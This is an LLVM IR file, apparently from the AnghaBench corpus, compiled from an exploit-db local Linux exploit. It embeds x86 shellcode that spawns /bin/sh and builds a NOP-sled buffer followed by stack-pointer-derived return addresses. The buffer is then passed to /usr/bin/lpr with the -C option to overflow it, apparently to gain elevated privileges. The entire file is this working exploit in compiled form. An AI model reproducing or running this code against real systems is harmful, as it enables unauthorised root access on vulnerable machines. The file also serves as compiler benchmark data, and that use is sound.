; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19544.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19544.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.execshell = private unnamed_addr constant [51 x i8] c"\EB$^\8D\1E\89^\0B3\D2\89V\07\89V\0F\B8\1BV4\125\10V4\12\8DN\0B\8B\D1\CD\803\C0@\CD\80\E8\D7\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [23 x i8] c"can't allocate memory\0A\00", align 1
@BUFFER_SIZE = common dso_local global i64 0, align 8
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [13 x i8] c"/usr/bin/lpr\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"lpr\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-C\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i64*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca [51 x i8], align 16
  %5 = alloca i32, align 4
  store i8* null, i8** %1, align 8
  store i64* null, i64** %2, align 8
  store i8* null, i8** %3, align 8
  %6 = bitcast [51 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.main.execshell, i32 0, i32 0), i64 51, i1 false)
  %7 = call i8* @malloc(i32 4096)
  store i8* %7, i8** %1, align 8
  %8 = load i8*, i8** %1, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %13, label %10

10:                                               ; preds = %0
  %11 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @exit(i32 0) #4
  unreachable

13:                                               ; preds = %0
  %14 = load i8*, i8** %1, align 8
  store i8* %14, i8** %3, align 8
  %15 = load i8*, i8** %3, align 8
  %16 = load i64, i64* @BUFFER_SIZE, align 8
  %17 = getelementptr inbounds [51 x i8], [51 x i8]* %4, i64 0, i64 0
  %18 = call i32 @strlen(i8* %17)
  %19 = sext i32 %18 to i64
  %20 = sub nsw i64 %16, %19
  %21 = call i32 @memset(i8* %15, i32 144, i64 %20)
  %22 = load i64, i64* @BUFFER_SIZE, align 8
  %23 = getelementptr inbounds [51 x i8], [51 x i8]* %4, i64 0, i64 0
  %24 = call i32 @strlen(i8* %23)
  %25 = sext i32 %24 to i64
  %26 = sub nsw i64 %22, %25
  %27 = load i8*, i8** %3, align 8
  %28 = getelementptr inbounds i8, i8* %27, i64 %26
  store i8* %28, i8** %3, align 8
  store i32 0, i32* %5, align 4
  br label %29

29:                                               ; preds = %41, %13
  %30 = load i32, i32* %5, align 4
  %31 = getelementptr inbounds [51 x i8], [51 x i8]* %4, i64 0, i64 0
  %32 = call i32 @strlen(i8* %31)
  %33 = icmp slt i32 %30, %32
  br i1 %33, label %34, label %44

34:                                               ; preds = %29
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [51 x i8], [51 x i8]* %4, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = load i8*, i8** %3, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %3, align 8
  store i8 %38, i8* %39, align 1
  br label %41

41:                                               ; preds = %34
  %42 = load i32, i32* %5, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %5, align 4
  br label %29

44:                                               ; preds = %29
  %45 = load i8*, i8** %3, align 8
  %46 = bitcast i8* %45 to i64*
  store i64* %46, i64** %2, align 8
  store i32 0, i32* %5, align 4
  br label %47

47:                                               ; preds = %57, %44
  %48 = load i32, i32* %5, align 4
  %49 = icmp slt i32 %48, 2
  br i1 %49, label %50, label %60

50:                                               ; preds = %47
  %51 = call i32 (...) @get_esp()
  %52 = load i32, i32* @DEFAULT_OFFSET, align 4
  %53 = add nsw i32 %51, %52
  %54 = sext i32 %53 to i64
  %55 = load i64*, i64** %2, align 8
  %56 = getelementptr inbounds i64, i64* %55, i32 1
  store i64* %56, i64** %2, align 8
  store i64 %54, i64* %55, align 8
  br label %57

57:                                               ; preds = %50
  %58 = load i32, i32* %5, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %5, align 4
  br label %47

60:                                               ; preds = %47
  %61 = load i64*, i64** %2, align 8
  %62 = bitcast i64* %61 to i8*
  store i8* %62, i8** %3, align 8
  %63 = load i8*, i8** %3, align 8
  store i8 0, i8* %63, align 1
  %64 = load i8*, i8** %1, align 8
  %65 = call i32 @execl(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %64, i32* null)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i64) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
